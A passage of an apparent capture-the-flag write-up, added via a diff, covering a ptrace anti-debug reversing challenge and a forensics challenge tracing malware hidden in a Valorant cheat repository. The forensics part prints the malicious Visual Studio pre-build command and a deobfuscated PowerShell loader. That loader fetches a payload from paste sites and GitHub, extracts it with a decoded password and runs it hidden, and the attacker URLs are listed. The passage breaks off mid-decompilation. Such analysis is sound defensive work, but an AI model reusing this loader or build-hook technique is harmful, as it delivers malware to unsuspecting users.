+</span><span style="color:#d08770;">0000000000000083</span><span> 8EB334B3F434                    MOV ST(-</span><span style="color:#d08770;">2</span><span>),WORD PTR [RBX+34F4B334]
+</span><span style="color:#d08770;">0000000000000089</span><span> B049                            MOV AL,</span><span style="color:#d08770;">49
+</span><span>000000000000008B 4147403A4044                    CMP AL,BYTE PTR [RAX+</span><span style="color:#d08770;">44</span><span>]
+</span><span style="color:#d08770;">0000000000000091 52</span><span>                              PUSH RDX
+</span><span style="color:#d08770;">0000000000000092 27                              </span><span>???
+</span><span style="color:#d08770;">0000000000000093 2027</span><span>                            AND BYTE PTR [RDI],AH
+</span><span style="color:#d08770;">0000000000000095</span><span> 85538A                          TEST DWORD PTR [RBX-</span><span style="color:#d08770;">76</span><span>],EDX
+</span><span style="color:#d08770;">0000000000000098</span><span> BAB7436680                      MOV EDX,806643B7
+</span><span>000000000000009D 8ED8                            MOV DS,EAX
+</span><span style="color:#d08770;">000000000000009F 223F</span><span>                            AND BH,BYTE PTR [RDI]
+</span><span>00000000000000A1 8987DF3B0ED0                    MOV DWORD PTR [RDI-2FF1C421],EAX
+</span><span>00000000000000A7 80D745                          ADC BH,</span><span style="color:#d08770;">45
+</span><span>00000000000000AA 2CAD                            SUB AL,AD
+</span><span>00000000000000AC B2C7                            MOV DL,C7
+</span><span>00000000000000AE 01738E                          ADD DWORD PTR [RBX-</span><span style="color:#d08770;">72</span><span>],ESI
+</span><span>00000000000000B1 D4                              ???
+</span><span>00000000000000B2 F027                            ???
+</span><span>00000000000000B4 05DB8B8F3F                      ADD EAX,3F8F8BDB
+</span><span>00000000000000B9 03829DCAF94C                    ADD EAX,DWORD PTR [RDX+4CF9CA9D]
+</span><span>00000000000000BF C444AC6B                        ???
+</span><span>00000000000000C3 </span><span style="color:#d08770;">50</span><span>                              PUSH RAX
+</span><span>00000000000000C4 </span><span style="color:#d08770;">57</span><span>                              PUSH RDI
+</span><span>00000000000000C5 </span><span style="color:#d08770;">6F</span><span>                              OUTS DX,DWORD PTR [RSI]
+</span><span>00000000000000C6 A948000CC0                      TEST EAX,C00C0048
+</span></code></pre>
+<p>The initial part contains an anti-debugging check, specifically checking for
+<a href="https://x64.syscall.sh/"><code>ptrace</code></a>:</p>
+<pre data-lang="as" style="background-color:#2b303b;color:#c0c5ce;" class="language-as "><code class="language-as" data-lang="as"><span>MOV EAX,</span><span style="color:#d08770;">00000065
+</span><span>SYSCALL
+</span></code></pre>
+<p>Using <a href="https://github.com/pwndbg/pwndbg"><code>pwndbg/pwndbg</code></a>, it's a little more clear:</p>
+<pre data-lang="as" style="background-color:#2b303b;color:#c0c5ce;" class="language-as "><code class="language-as" data-lang="as"><span> ► </span><span style="color:#d08770;">0x7ffff7fbf000</span><span>    mov    edi, </span><span style="color:#d08770;">1</span><span>             EDI =&gt; </span><span style="color:#d08770;">1
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf005</span><span>    xor    rsi, rsi           RSI =&gt; </span><span style="color:#d08770;">0
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf008</span><span>    xor    rdx, rdx           RDX =&gt; </span><span style="color:#d08770;">0
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf00b</span><span>    xor    r10, r10           R10 =&gt; </span><span style="color:#d08770;">0
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf00e</span><span>    mov    eax, </span><span style="color:#d08770;">0x65</span><span>          EAX =&gt; </span><span style="color:#d08770;">0x65
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf013</span><span>    syscall  &lt;SYS_ptrace&gt;
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf015</span><span>    cmp    rax, </span><span style="color:#d08770;">0
+</span></code></pre>
+<p>Setting <code>set $rax=0</code> right before that check is made to bypass it. The program
+then runs, looping a <em>lot</em>, before dying with this final set of instructions:</p>
+<pre data-lang="as" style="background-color:#2b303b;color:#c0c5ce;" class="language-as "><code class="language-as" data-lang="as"><span>   </span><span style="color:#d08770;">0x7ffff7fbf094</span><span>    mov    ebx, </span><span style="color:#d08770;">0x6174654d</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x6174654d
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf099</span><span>    mov    ebx, </span><span style="color:#d08770;">0x7b465443</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x7b465443
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf09e</span><span>    mov    ebx, </span><span style="color:#d08770;">0x6564346d</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x6564346d
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0a3</span><span>    mov    ebx, </span><span style="color:#d08770;">0x34306c5f</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x34306c5f
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0a8</span><span>    mov    ebx, </span><span style="color:#d08770;">0x5f723364</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x5f723364
+</span><span> ► </span><span style="color:#d08770;">0x7ffff7fbf0ad</span><span>    mov    ebx, </span><span style="color:#d08770;">0x72755f34</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x72755f34
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0b2</span><span>    mov    ebx, </span><span style="color:#d08770;">0x61306c5f</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x61306c5f
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0b7</span><span>    mov    ebx, </span><span style="color:#d08770;">0x7d723364</span><span>     EBX =&gt; </span><span style="color:#d08770;">0x7d723364
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0bc</span><span>    xor    rbx, rbx            RBX =&gt; </span><span style="color:#d08770;">0
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0bf</span><span>    mov    eax, </span><span style="color:#d08770;">0x3c</span><span>           EAX =&gt; </span><span style="color:#d08770;">0x3c
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0c4</span><span>    xor    ecx, eax            ECX =&gt; </span><span style="color:#d08770;">0</span><span> (</span><span style="color:#d08770;">0x3c</span><span> ^ </span><span style="color:#d08770;">0x3c</span><span>)
+</span><span>   </span><span style="color:#d08770;">0x7ffff7fbf0c6</span><span>    retf
+</span></code></pre>
+<p>Interestingly though:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>&gt;&gt;&gt; </span><span style="color:#d08770;">0x6174654d</span><span>.</span><span style="color:#bf616a;">to_bytes</span><span>(</span><span style="color:#d08770;">4</span><span>)
+</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">ateM</span><span>&#39;
+</span></code></pre>
+<p>Applying that same principle to the rest of the values:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>data = &quot;&quot;&quot;
+</span><span style="color:#a3be8c;">   0x7ffff7fbf094    mov    ebx, 0x6174654d     EBX =&gt; 0x6174654d
+</span><span style="color:#a3be8c;">   0x7ffff7fbf099    mov    ebx, 0x7b465443     EBX =&gt; 0x7b465443
+</span><span style="color:#a3be8c;">   0x7ffff7fbf09e    mov    ebx, 0x6564346d     EBX =&gt; 0x6564346d
+</span><span style="color:#a3be8c;">   0x7ffff7fbf0a3    mov    ebx, 0x34306c5f     EBX =&gt; 0x34306c5f
+</span><span style="color:#a3be8c;">   0x7ffff7fbf0a8    mov    ebx, 0x5f723364     EBX =&gt; 0x5f723364
+</span><span style="color:#a3be8c;"> ► 0x7ffff7fbf0ad    mov    ebx, 0x72755f34     EBX =&gt; 0x72755f34
+</span><span style="color:#a3be8c;">   0x7ffff7fbf0b2    mov    ebx, 0x61306c5f     EBX =&gt; 0x61306c5f
+</span><span style="color:#a3be8c;">   0x7ffff7fbf0b7    mov    ebx, 0x7d723364     EBX =&gt; 0x7d723364
+</span><span>&quot;&quot;&quot;
+</span><span>
+</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>(
+</span><span>    int_.</span><span style="color:#bf616a;">to_bytes</span><span>(</span><span style="color:#d08770;">4</span><span>, </span><span style="color:#bf616a;">byteorder</span><span>=&quot;</span><span style="color:#a3be8c;">little</span><span>&quot;).</span><span style="color:#bf616a;">decode</span><span>()
+</span><span>    </span><span style="color:#b48ead;">for </span><span>int_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">map</span><span>(</span><span style="color:#96b5b4;">eval</span><span>, (line.</span><span style="color:#bf616a;">split</span><span>()[-</span><span style="color:#d08770;">1</span><span>] </span><span style="color:#b48ead;">for </span><span>line </span><span style="color:#b48ead;">in </span><span>data.</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">splitlines</span><span>()))
+</span><span>)
+</span></code></pre>
+<p>Thankfully, that gives:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>MetaCTF{m4de_l04d3r_4_ur_l0ad3r}
+</span></code></pre>
+<h2 id="whisper-of-the-pain">Whisper Of The Pain</h2>
+<blockquote>
+<p><em>The Valorant gaming community has recently become the target of a mysterious
+cyber campaign. This operation appears to exploit players who use cheating
+tools, turning their machines into unwitting pawns in a larger scheme.</em></p>
+<p><em>Our investigation has led us to the computer of one such victim—a treasure
+trove of evidence awaits. Your mission is to dive deep, uncover the truth,
+and pinpoint the IP addresses used by the perpetrators to orchestrate this
+campaign. However, the analysis of the malicious samples has triggered the
+attackers. As a result, most of the links to the malicious code have now been
+taken down. Does this make it more difficult for you?</em></p>
+<p><em>Download the artifact
+<a href="https://metaproblems.com/c4e013408da63c6f86fae931d4f356aa/2025-01-17T040003_Evidence.zip">here</a>.
+Follow the investigation to it's end and you will uncover the flag.</em></p>
+</blockquote>
+<p>A quick grep for "cheat" turns up references to one
+<code>CyberValorant-Cheat-Visual-Aimbot-ESP</code> which sounds suitably promising. The
+SQLite database at
+<code>C/Users/IEUser/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History</code>
+also contains a reference to the GitHub repo. for that in its <code>urls</code> table:
+<a href="https://github.com/hannah1337/CyberValorant-Cheat-Visual-Aimbot-ESP"><code>hannah1337/CyberValorant-Cheat-Visual-Aimbot-ESP</code></a>.</p>
+<p>The <code>Valorant-External.vcxproj</code> in that repo. contains this:</p>
+<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>&lt;</span><span style="color:#bf616a;">PreBuildEvent</span><span>&gt;
+</span><span>  &lt;</span><span style="color:#bf616a;">Command</span><span>&gt;@echo off</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">D;</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">A;</span><span>setlocal</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">D;</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">A;</span><span>set &quot;a=%25TEMP%25\a&quot;</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">D;</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">A;</span><span>mkdir &quot;%25a%25&quot; 2</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">gt;</span><span>nul</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">D;</span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">A;</span><span>echo b = &quot;JFIgPSAiPXdtY2dzVG…
+</span><span>&lt;/</span><span style="color:#bf616a;">PreBuildEvent</span><span>&gt;
+</span></code></pre>
+<p>…well, a whole host of encoded data. With some CyberChef assistance:</p>
+<ul>
+<li>decoding HTML entities</li>
+<li>URL decoding</li>
+<li>replacing <code>&amp;#xD;&amp;#xA;</code> with <code>\r\n</code> (not sure what type of encoding this is)</li>
+</ul>
+<p>…it reduces to this (with some base64 chunks in there):</p>
+<pre data-lang="pwsh" style="background-color:#2b303b;color:#c0c5ce;" class="language-pwsh "><code class="language-pwsh" data-lang="pwsh"><span>@echo off
+</span><span>setlocal
+</span><span>set &quot;a=%TEMP%\a&quot;
+</span><span>mkdir &quot;%a%&quot; 2&gt;nul
+</span><span>echo b = &quot;JFIgPSAiPX…&quot; &gt; &quot;%a%\b.vbs&quot;
+</span><span>echo c = &quot;VdvQUNka0FDY…&quot; &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo d = &quot;JwUjNZdVZuW…&quot; &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo f.Text = e &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo g = f.NodeTypedValue &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo h = &quot;%a%\i.ps1&quot; &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo k.Write l(g) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo k.Close &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Function l(n) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Dim o, p &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo p = LenB(n) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo If p ^&gt; 0 Then &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo o.Open &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo o.AddNew &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo o.Update &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo Else &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo l = &quot;&quot; &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo End If &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>echo End Function &gt;&gt; &quot;%a%\b.vbs&quot;
+</span><span>cscript //nologo &quot;%a%\b.vbs&quot;
+</span><span>endlocal
+</span></code></pre>
+<p>…which, after yet more manipulation and base64 decoding gives:</p>
+<pre data-lang="pwsh" style="background-color:#2b303b;color:#c0c5ce;" class="language-pwsh "><code class="language-pwsh" data-lang="pwsh"><span>$R = &quot;=wmcgsTfgUWdulGdu92Q5xG…zb3JCIwByegknc0Byegwmcg42bpR3YuVnZ&quot;; $txt = $R.ToCharArray(); [array]::Reverse($txt); $bnb = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $txt)); $exp = &quot;Invoke-Expression&quot;; New-Alias -Name pWN -Value $exp -Force; pWN $bnb
+</span></code></pre>
+<p>…which after reversing and base64-decoding gives:</p>
+<pre data-lang="pwsh" style="background-color:#2b303b;color:#c0c5ce;" class="language-pwsh "><code class="language-pwsh" data-lang="pwsh"><span>function rl { try { p &quot;wo7CucOmwqzCuMKWaMKUw5zCn8K9wr/CqsKIwq7DoGrCqMOLwqbClMOewp/DgXrCkHjCjcKowpbClcK1wpI=&quot; } catch { x } } function x { try { p &quot;wo7CucOmwqzCuMKWaMKUw5zCn8K9wr/CqsKIwq7DoGrCqMOLwqbClMOewp/DgXrCnH7Cu8KlfcKewrDCqw==&quot; } catch { l } } function l { try { p &quot;wo7CucOmwqzCuMKWaMKUw57CqsKzwrhzwonCtMOfa8K5wqZwwq7DonN3woPCu2d0w6TCncK8&quot; } catch { o } } function o { try { p &quot;wo7CucOmwqzCuMKWaMKUw57Co8K4wr/Ct8Kfc8OVwqt0w5ZswpvCnsK2wrXCg8KrVcK3w5PCsw==&quot; } catch { Start-Sleep -Seconds 20; rl } }; function p { param ([string]$e) if (-not $e) { return } try { $d = d -mm $e -k $prooc; $r = Invoke-RestMethod -Uri $d; if ($r) { $dl = d -mm $r -k $proc } $g = [System.Guid]::NewGuid().ToString(); $t = [System.IO.Path]::GetTempPath(); $f = Join-Path $t ($g + &quot;.7z&quot;); $ex = Join-Path $t ([System.Guid]::NewGuid().ToString()); $c = New-Object System.Net.WebClient; $b = $c.DownloadData($dl); if ($b.Length -gt 0) { [System.IO.File]::WriteAllBytes($f, $b); e -a $f -o $ex; $exF = Join-Path $ex &quot;SearchFilter.exe&quot;; if (Test-Path $exF) { Start-Process -FilePath $exF -WindowStyle Hidden } if (Test-Path $f) { Remove-Item $f } } } catch { throw } }; $prooc = &quot;&amp;Er&lt;E\9el&gt;J`KE&quot;; function d { param ([string]$mm, [string]$k) try { $b = [System.Convert]::FromBase64String($mm); $s = [System.Text.Encoding]::UTF8.GetString($b); $d = New-Object char[] $s.Length; for ($i = 0; $i -lt $s.Length; $i++) { $c = $s[$i]; $p = $k[$i % $k.Length]; $d[$i] = [char]($c - $p) }; return -join $d } catch { throw } }; $proc = &quot;```$b#{o*%3I,};&#39;,W```&quot;n~O@0&quot;; function v { param ([string]$i) $b = [System.Convert]::FromBase64String($i); $s = [System.Text.Encoding]::UTF8.GetString($b); $c = $s -split &#39; &#39;; $r = &quot;&quot;; foreach ($x in $c) { $r += [char][int]$x }; return $r }; function e { param ([string]$a, [string]$o) $s = &quot;NTAgNTAgNTUgNTEgNTIgNTMgNTQgNTEgNTUgNTAgNTEgNTEgNTUgNTIgNTAgMTAwIDU1IDQ4IDUyIDQ4IDU1IDUxIDU1IDUxIDU1IDU1IDUxIDQ4IDU1IDUwIDU0IDUyIDUwIDUw&quot;; $p = v -i $s; $z = &quot;C:\ProgramData\seventzip\7z.exe&quot;; $arg = &quot;x `&quot;$a`&quot; -o`&quot;$o`&quot; -p$p -y&quot;; Start-Process -FilePath $z -ArgumentList $arg -WindowStyle Hidden -Wait }; $d = &quot;C:\ProgramData\seventzip&quot;; if (-not (Test-Path &quot;$d\7z.exe&quot;)) { New-Item -ItemType Directory -Path $d -Force | Out-Null; $u = &quot;https://www.7-zip.org/a/7zr.exe&quot;; $o = Join-Path -Path $d -ChildPath &quot;7z.exe&quot;; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, $o); $wc.Dispose(); Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue; Set-ItemProperty -Path $d -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue }; rl
+</span></code></pre>
+<p>Those base64 strings are passed through <code>function d</code>:</p>
+<pre data-lang="pwsh" style="background-color:#2b303b;color:#c0c5ce;" class="language-pwsh "><code class="language-pwsh" data-lang="pwsh"><span>function d {
+</span><span>    param ([string]$mm, [string]$k)
+</span><span>    try {
+</span><span>        $b = [System.Convert]::FromBase64String($mm);
+</span><span>        $s = [System.Text.Encoding]::UTF8.GetString($b);
+</span><span>        $d = New-Object char[] $s.Length;
+</span><span>        for ($i = 0; $i -lt $s.Length; $i++) {
+</span><span>            $c = $s[$i];
+</span><span>            $p = $k[$i % $k.Length];
+</span><span>            $d[$i] = [char]($c - $p)
+</span><span>        };
+</span><span>        return -join $d
+</span><span>    } catch {
+</span><span>        throw
+</span><span>    }
+</span><span>};
+</span></code></pre>
+<p>…where <code>mm</code> is the base64 string and <code>k</code> is the value of <code>prooc</code>:
+<code>&amp;Er&lt;E\9el&gt;JKE</code>, for example:</p>
+<pre data-lang="pwsh" style="background-color:#2b303b;color:#c0c5ce;" class="language-pwsh "><code class="language-pwsh" data-lang="pwsh"><span>PS /mnt&gt; $mm = &quot;wo7CucOmwqzCuMKWaMKUw5zCn8K9wr/CqsKIwq7DoGrCqMOLwqbClMOewp/DgXrCkHjCjcKowpbClcK1wpI=&quot;;
+</span><span>PS /mnt&gt; $k = &quot;&amp;Er&lt;E\9el&gt;J`KE&quot;;
+</span><span>PS /mnt&gt; d -mm $mm -k $k;
+</span><span>https://pastebin.com/raw/KRH6ZPYY
+</span></code></pre>
+<p>Repeating that for the remaining 3 base64 chunks yields:</p>
+<ul>
+<li><code>https://pastebin.com/raw/KRH6ZPYY</code></li>
+<li><code>https://pastebin.com/raw/WXv3AYTr</code></li>
+<li><code>https://rlim.com/tJ7Iv5-8vA/raw</code></li>
+<li><code>https://rentry.co/z362xk8f/raw</code></li>
+</ul>
+<p>3 of these have been removed but the <code>rlim.com</code> one allows the history to be
+viewed (after wrangling with the site's over-enthusiastic ads.) and although it
+now shows <code>REDACTED</code>, previously it was:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>w4jCmMOWwpPDrsKpWVTCmsKywqDDpcKwwolawrrDj8KPwp3DpsKwwqPCm8OEwoXDj8KIw6/DkMKgworCpcK8wpHCrMKfwozCmMK/w4lPw5vDo8ODwrLCn8KPwpbDh8KPw6DDkMKdworCpnjCkMOswrLClcKYw4bDgcKGwp3Dq8K0wrTCosOPU8K2d8K/w4HCj8KVwp/CqsKlwqtywqE=
+</span></code></pre>
+<p>Using the value of <code>proc</code> from the above:</p>
+<pre data-lang="pwsh" style="background-color:#2b303b;color:#c0c5ce;" class="language-pwsh "><code class="language-pwsh" data-lang="pwsh"><span>PS /mnt&gt; $k = &quot;```$b#{o*%3I,};&#39;,W```&quot;n~O@0&quot;;
+</span><span>PS /mnt&gt; d -mm $mm -k $k;
+</span><span>https://github.com/hackdametaverse/delhi-metro/releases/download/metro/TTDReplay.7z
+</span></code></pre>
+<p>The 7z archive is password protected and the password is again base64 encoded
+but it's the ASCII values of the characters, not the password directly:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>base64
+</span><span>
+</span><span>`&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>(
+</span><span>    </span><span style="color:#96b5b4;">map</span><span>(
+</span><span>        </span><span style="color:#96b5b4;">chr</span><span>,
+</span><span>        </span><span style="color:#96b5b4;">map</span><span>(
+</span><span>            int,
+</span><span>            base64.</span><span style="color:#bf616a;">b64decode</span><span>(
+</span><span>                &quot;</span><span style="color:#a3be8c;">NTAgNTAgNTUgNTEgNTIgNTMgNTQgNTEgNTUgNTAgNTEgNTEgNTUgNTIgNTAgMTAwIDU1IDQ4IDUyIDQ4IDU1IDUxIDU1IDUxIDU1IDU1IDUxIDQ4IDU1IDUwIDU0IDUyIDUwIDUw</span><span>&quot;
+</span><span>            ).</span><span style="color:#bf616a;">decode</span><span>().</span><span style="color:#bf616a;">split</span><span>()
+</span><span>        )
+</span><span>    )
+</span><span>)
+</span></code></pre>
+<p>Using the resulting password of <code>227345637233742d704073737730726422</code> extracts
+an executable, <code>SearchFilter.exe</code>:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">┌──</span><span>(root㉿psy-xps-13)</span><span style="color:#bf616a;">-[/mnt]
+</span><span style="color:#bf616a;">└─#</span><span> file SearchFilter.exe
+</span><span style="color:#bf616a;">SearchFilter.exe:</span><span> PE32 executable (GUI) </span><span style="color:#bf616a;">Intel</span><span> 80386 Mono/.Net assembly, for MS Windows, 2 sections
+</span></code></pre>
+<p>As it's a .NET executable,
+<a href="https://github.com/icsharpcode/ILSpy/tree/master/ICSharpCode.ILSpyCmd"><code>ILSpyCmd</code></a>
+to the rescue…sort of. Class names and variables appear to be in Chinese
+(according to Google Translate) making things a touch difficult <em>but</em> thanks to
+references to things like this:</p>
+<pre data-lang="cs" style="background-color:#2b303b;color:#c0c5ce;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#b48ead;">namespace </span><span>人的執她的行人使成澤顧商接太
+</span><span>{
+</span><span>    </span><span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">澤程席成顧受
+</span><span style="color:#eff1f5;">    {
+</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">public static object </span><span style="color:#8fa1b3;">城成生顧的家商席商</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">string </span><span style="color:#bf616a;">受將合人顧太孫合承</span><span style="color:#eff1f5;">)
+</span><span style="color:#eff1f5;">        {
+</span><span style="color:#eff1f5;">            RijndaelManaged </span><span style="color:#bf616a;">rijndaelManaged </span><span>= new </span><span style="color:#eff1f5;">RijndaelManaged();
+</span><span style="color:#eff1f5;">            MD5CryptoServiceProvider </span><span style="color:#bf616a;">mD5CryptoServiceProvider </span><span>= new </span><span style="color:#eff1f5;">MD5CryptoServiceProvider();
+</span></code></pre>
+<p>…there's at least some sense of what's happening. This base64 string appears to
+be encryped:</p>
+<pre data-lang="cs" style="background-color:#2b303b;color:#c0c5ce;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#b48ead;">public static string </span><span style="color:#bf616a;">為公的敬顧管生人承導太希 </span><span>= &quot;</span><span style="color:#a3be8c;">kxpp2h/dBYdEEY5NSXs4qGq+91pW6PsavDuNGg+u+IXLR0W2o0d5Cdg9OXc8qQ+i</span><span>&quot;;
+</span></code></pre>
+<p>…with the encryption key being derived from this:</p>
+<pre data-lang="cs" style="background-color:#2b303b;color:#c0c5ce;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#b48ead;">public static string </span><span style="color:#bf616a;">敬顧執子顧 </span><span>= &quot;</span><span style="color:#a3be8c;">$</span><span style="color:#d08770;">{8</span><span style="background-color:#bf616a;color:#2b303b;">&#39;,`d0</span><span style="color:#d08770;">}</span><span style="color:#a3be8c;">n,~@J;oZ</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">9a</span><span>&quot;;
+</span></code></pre>
+<p>…from which the code calculates the MD5 and combines the first 15 and then 16
+bytes of said hash, plus a final <code>0</code>:</p>
+<pre data-lang="cs" style="background-color:#2b303b;color:#c0c5ce;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#b48ead;">byte</span><span>[] </span><span style="color:#bf616a;">array </span><span>= new </span><span style="color:#b48ead;">byte</span><span>[</span><span style="color:#d08770;">32</span><span>];
+</span><span style="color:#b48ead;">byte</span><span>[] </span><span style="color:#bf616a;">sourceArray </span><span>= </span><span style="color:#bf616a;">mD5CryptoServiceProvider</span><span>.</span><span style="color:#bf616a;">ComputeHash</span><span>(</span><span style="color:#bf616a;">成商澤子金命城</span><span>.</span><span style="color:#bf616a;">尊的尊澤人希人</span><span>(</span><span style="color:#bf616a;">家顧玉的澤顧人</span><span>.</span><span style="color:#bf616a;">敬顧執子顧</span><span>));
+</span><span style="color:#bf616a;">Array</span><span>.</span><span style="color:#bf616a;">Copy</span><span>(</span><span style="color:#bf616a;">sourceArray</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#bf616a;">array</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">16</span><span>);
+</span><span style="color:#bf616a;">Array</span><span>.</span><span style="color:#bf616a;">Copy</span><span>(</span><span style="color:#bf616a;">sourceArray</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#bf616a;">array</span><span>, </span><span style="color:#d08770;">15</span><span>, </span><span style="color:#d08770;">16</span><span>);
+</span></code></pre>
+<p>…before finally being encrypted:</p>
+<pre data-lang="cs" style="background-color:#2b303b;color:#c0c5ce;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#bf616a;">rijndaelManaged</span><span>.</span><span style="color:#bf616a;">Key </span><span>= </span><span style="color:#bf616a;">array</span><span>;
+</span><span style="color:#bf616a;">rijndaelManaged</span><span>.</span><span style="color:#bf616a;">Mode </span><span>= </span><span style="color:#bf616a;">CipherMode</span><span>.</span><span style="color:#bf616a;">ECB</span><span>;
+</span><span>ICryptoTransform </span><span style="color:#bf616a;">cryptoTransform </span><span>= </span><span style="color:#bf616a;">rijndaelManaged</span><span>.</span><span style="color:#bf616a;">CreateEncryptor</span><span>();
+</span><span style="color:#b48ead;">byte</span><span>[] </span><span style="color:#bf616a;">array2 </span><span>= </span><span style="color:#bf616a;">成商澤子金命城</span><span>.</span><span style="color:#bf616a;">尊的尊澤人希人</span><span>(</span><span style="color:#bf616a;">受將合人顧太孫合承</span><span>);
